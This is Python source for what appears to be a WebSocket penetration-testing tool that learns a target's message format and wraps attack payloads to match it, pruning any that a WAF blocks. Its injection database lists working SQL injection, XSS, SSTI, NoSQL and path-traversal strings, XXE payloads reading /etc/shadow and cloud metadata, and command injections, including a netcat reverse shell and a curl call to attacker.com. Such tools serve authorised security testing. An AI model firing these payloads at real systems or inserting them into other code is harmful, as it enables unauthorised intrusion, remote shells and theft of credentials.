#!/usr/bin/env python3
"""
WSHawk Context-Aware Payload Generator
Generates attack payloads based on server response analysis

Author: Regaan (@regaan)
"""

import re
import json
import random
import string
from typing import List, Dict, Optional, Any, Set, Tuple
from datetime import datetime

from ..console import Logger


class ContextAwareGenerator:
    """
    Generate payloads that match the expected input format of the target.
    
    Instead of blindly throwing payloads, this module:
    1. Analyzes sample server messages to understand the expected format
    2. Identifies field types, constraints, and patterns
    3. Generates payloads that match the format but contain injection vectors
    4. Adapts payloads based on WAF/filter detection
    
    This dramatically improves payload success rate — injections embedded
    in properly formatted messages bypass more filters than raw payloads.
    """
    
    def __init__(self):
        # Learned context from server responses
        self.context: Dict[str, Any] = {
            'format': None,           # json, xml, text, binary
            'fields': {},             # field_name → {type, constraints, samples}
            'delimiters': [],         # message delimiter patterns
            'response_patterns': [],  # common response patterns
            'blocked_patterns': set(),  # patterns that triggered WAF/blocks
            'successful_patterns': set(),  # patterns that got through
        }
        
        self.sample_count = 0
        self.analysis_complete = False
    
    def learn_from_message(self, message: str, direction: str = 'received'):
        """
        Learn input format from a sample message.
        
        Args:
            message: WebSocket message content
            direction: 'sent' or 'received'
        """
        self.sample_count += 1
        
        # Detect format
        fmt = self._detect_format(message)
        if fmt and not self.context['format']:
            self.context['format'] = fmt
            Logger.info(f"Context: Detected message format: {fmt}")
        
        if fmt == 'json':
            self._learn_json_structure(message)
        elif fmt == 'xml':
            self._learn_xml_structure(message)
        else:
            self._learn_text_structure(message)
        
        if self.sample_count >= 3:
            self.analysis_complete = True
    
    def generate_payloads(self, vuln_type: str = 'all', count: int = 20) -> List[str]:
        """
        Generate context-aware payloads.
        
        Args:
            vuln_type: Target vulnerability type
            count: Number of payloads to generate
            
        Returns:
            List of formatted payloads
        """
        payloads = []
        
        if self.context['format'] == 'json':
            payloads.extend(self._generate_json_payloads(vuln_type, count))
        elif self.context['format'] == 'xml':
            payloads.extend(self._generate_xml_payloads(vuln_type, count))
        else:
            payloads.extend(self._generate_text_payloads(vuln_type, count))
        
        # Filter out blocked patterns
        if self.context['blocked_patterns']:
            payloads = [
                p for p in payloads
                if not any(blocked in p for blocked in self.context['blocked_patterns'])
            ]
        
        Logger.info(f"Generated {len(payloads)} context-aware payloads ({vuln_type})")
        return payloads[:count]
    
    def mark_blocked(self, payload: str, response: str = ''):
        """Mark a payload pattern as blocked by WAF/filter."""
        # Extract the injection core from the payload
        injection_patterns = self._extract_injection_core(payload)
        for pat in injection_patterns:
            self.context['blocked_patterns'].add(pat)
    
    def mark_successful(self, payload: str):
        """Mark a payload pattern as successful (got through filters)."""
        patterns = self._extract_injection_core(payload)
        for pat in patterns:
            self.context['successful_patterns'].add(pat)
    
    # ─── Format Detection ───────────────────────────────────────────
    
    def _detect_format(self, message: str) -> Optional[str]:
        """Detect message format."""
        stripped = message.strip()
        
        # JSON
        if (stripped.startswith('{') and stripped.endswith('}')) or \
           (stripped.startswith('[') and stripped.endswith(']')):
            try:
                json.loads(stripped)
                return 'json'
            except (json.JSONDecodeError, ValueError):
                pass
        
        # XML
        if stripped.startswith('<') and stripped.endswith('>'):
            return 'xml'
        
        # Key=Value
        if '=' in stripped and '&' in stripped:
            return 'params'
        
        return 'text'
    
    # ─── JSON Learning ──────────────────────────────────────────────
    
    def _learn_json_structure(self, message: str):
        """Learn JSON field types and constraints."""
        try:
            data = json.loads(message)
            if isinstance(data, dict):
                self._learn_dict_fields(data, prefix='')
        except (json.JSONDecodeError, ValueError):
            pass
    
    def _learn_dict_fields(self, data: Dict, prefix: str):
        """Recursively learn field types."""
        for key, value in data.items():
            full_key = f"{prefix}.{key}" if prefix else key
            
            if full_key not in self.context['fields']:
                self.context['fields'][full_key] = {
                    'type': type(value).__name__,
                    'samples': [],
                    'constraints': {},
                }
            
            field = self.context['fields'][full_key]
            
            if isinstance(value, str):
                field['type'] = 'str'
                field['samples'].append(value[:100])
                
                # Detect constraints
                if len(value) > 0:
                    field['constraints']['max_length'] = max(
                        field['constraints'].get('max_length', 0), len(value)
                    )
                    field['constraints']['min_length'] = min(
                        field['constraints'].get('min_length', 999), len(value)
                    )
                
                # Detect patterns
                if re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', value):
                    field['constraints']['pattern'] = 'email'
                elif re.match(r'^https?://', value):
                    field['constraints']['pattern'] = 'url'
                elif re.match(r'^\d{4}-\d{2}-\d{2}', value):
                    field['constraints']['pattern'] = 'date'
                elif re.match(r'^[0-9a-f]{8}-', value):
                    field['constraints']['pattern'] = 'uuid'
                elif value.isdigit():
                    field['constraints']['pattern'] = 'numeric_string'
                    
            elif isinstance(value, (int, float)):
                field['type'] = 'number'
                field['samples'].append(value)
                
            elif isinstance(value, bool):
                field['type'] = 'bool'
                
            elif isinstance(value, list):
                field['type'] = 'array'
                field['constraints']['item_count'] = len(value)
                
            elif isinstance(value, dict):
                field['type'] = 'object'
                self._learn_dict_fields(value, full_key)
    
    # ─── XML Learning ───────────────────────────────────────────────
    
    def _learn_xml_structure(self, message: str):
        """Learn XML element structure."""
        # Extract element names and their content
        elements = re.findall(r'<(\w+)(?:\s[^>]*)?>([^<]*)</\1>', message)
        for name, content in elements:
            full_key = f"xml.{name}"
            if full_key not in self.context['fields']:
                self.context['fields'][full_key] = {
                    'type': 'xml_element',
                    'samples': [],
                    'constraints': {},
                }
            self.context['fields'][full_key]['samples'].append(content[:100])
        
        # Extract attributes
        attrs = re.findall(r'(\w+)=["\']([^"\']*)["\']', message)
        for name, value in attrs:
            full_key = f"xml.@{name}"
            if full_key not in self.context['fields']:
                self.context['fields'][full_key] = {
                    'type': 'xml_attribute',
                    'samples': [],
                    'constraints': {},
                }
            self.context['fields'][full_key]['samples'].append(value[:100])
    
    # ─── Text Learning ──────────────────────────────────────────────
    
    def _learn_text_structure(self, message: str):
        """Learn text-based message structure."""
        # Look for common delimiters
        for delim in ['|', '\t', ',', ':', ';']:
            if delim in message:
                parts = message.split(delim)
                if len(parts) > 1:
                    self.context['delimiters'].append(delim)
                    for i, part in enumerate(parts):
                        key = f"field_{i}"
                        if key not in self.context['fields']:
                            self.context['fields'][key] = {
                                'type': 'text_field',
                                'samples': [],
                                'constraints': {},
                            }
                        self.context['fields'][key]['samples'].append(part.strip()[:100])
                    break
    
    # ─── JSON Payload Generation ────────────────────────────────────
    
    def _generate_json_payloads(self, vuln_type: str, count: int) -> List[str]:
        """Generate JSON-formatted payloads."""
        payloads = []
        injections = self._get_injections(vuln_type)
        
        string_fields = [
            k for k, v in self.context['fields'].items()
            if v['type'] == 'str'
        ]
        
        if not string_fields:
            # No learned fields — generate generic JSON payloads
            for inj in injections:
                payloads.append(json.dumps({"input": inj}))
                payloads.append(json.dumps({"message": inj}))
                payloads.append(json.dumps({"data": inj}))
            return payloads
        
        # Build template from learned structure
        for field in string_fields:
            for inj in injections:
                template = self._build_json_template()
                
                # Inject into this specific field
                keys = field.split('.')
                obj = template
                for key in keys[:-1]:
                    if key not in obj:
                        obj[key] = {}
                    obj = obj[key]
                obj[keys[-1]] = inj
                
                payloads.append(json.dumps(template))
        
        # Also generate payloads with injections in ALL string fields
        for inj in injections[:5]:
            template = self._build_json_template()
            for field in string_fields:
                keys = field.split('.')
                obj = template
                for key in keys[:-1]:
                    if key not in obj:
                        obj[key] = {}
                    obj = obj[key]
                obj[keys[-1]] = inj
            payloads.append(json.dumps(template))
        
        # Type confusion payloads
        for field in string_fields[:3]:
            for value in [True, 0, None, [], {"__proto__": {"admin": True}}]:
                template = self._build_json_template()
                keys = field.split('.')
                obj = template
                for key in keys[:-1]:
                    if key not in obj:
                        obj[key] = {}
                    obj = obj[key]
                obj[keys[-1]] = value
                payloads.append(json.dumps(template))
        
        return payloads
    
    def _build_json_template(self) -> Dict:
        """Build a JSON template from learned fields."""
        template = {}
        
        for field_name, field_info in self.context['fields'].items():
            keys = field_name.split('.')
            obj = template
            
            for key in keys[:-1]:
                if key not in obj:
                    obj[key] = {}
                obj = obj[key]
            
            last_key = keys[-1]
            
            if field_info['type'] == 'str':
                sample = field_info['samples'][-1] if field_info['samples'] else 'test'
                obj[last_key] = sample
            elif field_info['type'] == 'number':
                sample = field_info['samples'][-1] if field_info['samples'] else 1
                obj[last_key] = sample
            elif field_info['type'] == 'bool':
                obj[last_key] = True
            elif field_info['type'] == 'array':
                obj[last_key] = []
            elif field_info['type'] == 'object':
                if last_key not in obj:
                    obj[last_key] = {}
        
        return template
    
    # ─── XML Payload Generation ─────────────────────────────────────
    
    def _generate_xml_payloads(self, vuln_type: str, count: int) -> List[str]:
        """Generate XML-formatted payloads."""
        payloads = []
        injections = self._get_injections(vuln_type)
        
        xml_fields = [
            k for k, v in self.context['fields'].items()
            if v['type'] == 'xml_element'
        ]
        
        for field in xml_fields:
            element_name = field.replace('xml.', '')
            for inj in injections:
                payloads.append(f"<{element_name}>{inj}</{element_name}>")
        
        # XXE payloads
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
        ]
        payloads.extend(xxe_payloads)
        
        return payloads
    
    # ─── Text Payload Generation ────────────────────────────────────
    
    def _generate_text_payloads(self, vuln_type: str, count: int) -> List[str]:
        """Generate text-formatted payloads."""
        payloads = []
        injections = self._get_injections(vuln_type)
        
        for inj in injections:
            payloads.append(inj)
        
        # If we learned delimiters, generate structured payloads
        if self.context['delimiters']:
            delim = self.context['delimiters'][0]
            field_count = len([k for k in self.context['fields'] if k.startswith('field_')])
            
            for inj in injections:
                parts = []
                for i in range(field_count):
                    field_key = f"field_{i}"
                    field_info = self.context['fields'].get(field_key, {})
                    samples = field_info.get('samples', ['test'])
                    parts.append(random.choice(samples) if samples else 'test')
                
                # Inject into each position
                for pos in range(len(parts)):
                    modified = list(parts)
                    modified[pos] = inj
                    payloads.append(delim.join(modified))
        
        return payloads
    
    # ─── Injection Database ─────────────────────────────────────────
    
    def _get_injections(self, vuln_type: str) -> List[str]:
        """Get injection strings, filtered by what's been blocked."""
        base = {
            'sqli': [
                "' OR 1=1--", "'; DROP TABLE users;--",
                "1 UNION SELECT null,null,null--", "admin'--",
                "1' AND SLEEP(5)--", "1 OR 1=1#",
                "' OR ''='", "') OR ('1'='1",
                "1; EXEC xp_cmdshell('whoami')--",
                "' UNION ALL SELECT null,version(),null--",
            ],
            'xss': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '"><svg onload=alert(1)>',
                "javascript:alert(document.cookie)",
                '<details open ontoggle=alert(1)>',
                '{{constructor.constructor("return this")()}}',
                '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
                '<svg><animate onbegin=alert(1) attributeName=x>',
            ],
            'cmdi': [
                '; cat /etc/passwd', '| whoami', '$(id)', '`id`',
                '; ping -c 3 127.0.0.1', '&& curl http://attacker.com',
                '| timeout 5 sleep 5', '$(cat /etc/shadow)',
                '; ls -la /', '| nc -e /bin/sh attacker.com 4444',
            ],
            'ssti': [
                '{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>',
                '{{config}}', '{{self.__class__.__mro__}}',
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
                '{{request.application.__globals__.__builtins__}}',
            ],
            'nosql': [
                '{"$gt": ""}', '{"$ne": null}', '{"$regex": ".*"}',
                '{"$where": "return true"}', '{"$exists": true}',
                'true, $where: \'1 == 1\'',
            ],
            'traversal': [
                '../../etc/passwd', '..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow', '....//....//etc/passwd',
                '%252e%252e%252fetc%252fpasswd',
                '..%c0%af..%c0%af..%c0%afetc/passwd',
            ],
        }
        
        if vuln_type == 'all':
            all_inj = []
            for vals in base.values():
                all_inj.extend(vals)
            return all_inj
        
        return base.get(vuln_type, base.get('sqli', []))
    
    def _extract_injection_core(self, payload: str) -> List[str]:
        """Extract the core injection pattern from a payload."""
        cores = []
        
        # Common injection markers
        markers = [
            "alert(", "script>", "onerror=", "onload=",
            "OR 1=1", "UNION SELECT", "DROP TABLE",
            "SLEEP(", "/etc/passwd", "whoami",
            "{{", "${", "<%=",
        ]
        
        for marker in markers:
            if marker in payload:
                cores.append(marker)
        
        return cores
